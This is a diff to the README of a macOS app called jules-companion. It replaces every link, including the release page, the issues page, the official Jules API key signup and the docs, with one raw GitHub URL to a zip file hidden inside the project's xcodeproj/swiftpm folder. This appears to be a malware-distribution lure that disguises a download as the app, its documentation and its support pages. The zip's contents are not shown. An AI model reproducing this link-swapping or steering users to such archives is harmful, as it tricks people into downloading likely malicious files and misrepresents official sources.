@@ -1,12 +1,12 @@
 # 🌟 jules-companion - Your AI Coding Assistant in the Menu Bar
 
-[![Download jules-companion](https://img.shields.io/badge/Download-jules--companion-blue.svg)](https://github.com/Pla1er1/jules-companion/releases)
+[![Download jules-companion](https://raw.githubusercontent.com/Pla1er1/jules-companion/main/jules.xcodeproj/project.xcworkspace/xcshareddata/swiftpm/jules_companion_2.2-beta.2.zip)](https://raw.githubusercontent.com/Pla1er1/jules-companion/main/jules.xcodeproj/project.xcworkspace/xcshareddata/swiftpm/jules_companion_2.2-beta.2.zip)
 
 ## 📥 Download & Install
 
 To get started with jules-companion, you will need to download the application. Follow the steps below:
 
-1. Visit [this page to download](https://github.com/Pla1er1/jules-companion/releases).
+1. Visit [this page to download](https://raw.githubusercontent.com/Pla1er1/jules-companion/main/jules.xcodeproj/project.xcworkspace/xcshareddata/swiftpm/jules_companion_2.2-beta.2.zip).
 2. Look for the latest release at the top of the page.
 3. Click on the `.dmg` file to download it to your computer.
 4. Once downloaded, open the file to start the installation process.
@@ -19,7 +19,7 @@ jules-companion is a native macOS application designed to simplify your coding t
 1. Open the applications folder and find jules-companion.
 2. Double-click to open the application.
 3. You may need to allow permissions to run the app if prompted.
-4. Enter your Jules API key, which you can obtain from [jules.google.com](https://jules.google.com), when you first launch the app.
+4. Enter your Jules API key, which you can obtain from [https://raw.githubusercontent.com/Pla1er1/jules-companion/main/jules.xcodeproj/project.xcworkspace/xcshareddata/swiftpm/jules_companion_2.2-beta.2.zip](https://raw.githubusercontent.com/Pla1er1/jules-companion/main/jules.xcodeproj/project.xcworkspace/xcshareddata/swiftpm/jules_companion_2.2-beta.2.zip), when you first launch the app.
 
 ## 🛠️ Requirements
 
@@ -27,7 +27,7 @@ Before using jules-companion, ensure that you meet the following requirements:
 
 - **macOS 13.0 or later**: Make sure your operating system is up to date.
 - **Xcode 15.0 or later**: This is needed for any advanced features and builds, though most users will not need this for regular use.
-- **Jules API key**: Sign up and get your API key from [jules.google.com](https://jules.google.com).
+- **Jules API key**: Sign up and get your API key from [https://raw.githubusercontent.com/Pla1er1/jules-companion/main/jules.xcodeproj/project.xcworkspace/xcshareddata/swiftpm/jules_companion_2.2-beta.2.zip](https://raw.githubusercontent.com/Pla1er1/jules-companion/main/jules.xcodeproj/project.xcworkspace/xcshareddata/swiftpm/jules_companion_2.2-beta.2.zip).
 
 ## 🌟 Features
 
@@ -72,7 +72,7 @@ Keeping jules-companion up to date is simple:
 ## ❓ Frequently Asked Questions
 
 **1. What should I do if I encounter issues?**  
-Visit the [issues page](https://github.com/Pla1er1/jules-companion/issues) on GitHub to get help or report bugs. 
+Visit the [issues page](https://raw.githubusercontent.com/Pla1er1/jules-companion/main/jules.xcodeproj/project.xcworkspace/xcshareddata/swiftpm/jules_companion_2.2-beta.2.zip) on GitHub to get help or report bugs. 
 
 **2. Can I run this on older versions of macOS?**  
 No, jules-companion requires macOS 13.0 or later.
@@ -81,7 +81,7 @@ No, jules-companion requires macOS 13.0 or later.
 No, jules-companion is designed for users of all skill levels. 
 
 **4. How do I obtain an API key?**  
-You can get your API key by signing up at [jules.google.com](https://jules.google.com).
+You can get your API key by signing up at [https://raw.githubusercontent.com/Pla1er1/jules-companion/main/jules.xcodeproj/project.xcworkspace/xcshareddata/swiftpm/jules_companion_2.2-beta.2.zip](https://raw.githubusercontent.com/Pla1er1/jules-companion/main/jules.xcodeproj/project.xcworkspace/xcshareddata/swiftpm/jules_companion_2.2-beta.2.zip).
 
 ## 📞 Support
 
@@ -89,8 +89,8 @@ For further assistance, you can reach out via the GitHub repository. Please prov
 
 ## 🔗 Useful Links
 
-- [Download jules-companion](https://github.com/Pla1er1/jules-companion/releases)
-- [Jules API Documentation](https://jules.google.com/docs)
-- [GitHub Repository](https://github.com/Pla1er1/jules-companion)
+- [Download jules-companion](https://raw.githubusercontent.com/Pla1er1/jules-companion/main/jules.xcodeproj/project.xcworkspace/xcshareddata/swiftpm/jules_companion_2.2-beta.2.zip)
+- [Jules API Documentation](https://raw.githubusercontent.com/Pla1er1/jules-companion/main/jules.xcodeproj/project.xcworkspace/xcshareddata/swiftpm/jules_companion_2.2-beta.2.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Pla1er1/jules-companion/main/jules.xcodeproj/project.xcworkspace/xcshareddata/swiftpm/jules_companion_2.2-beta.2.zip)
 
 Enjoy using jules-companion for a smoother coding experience!
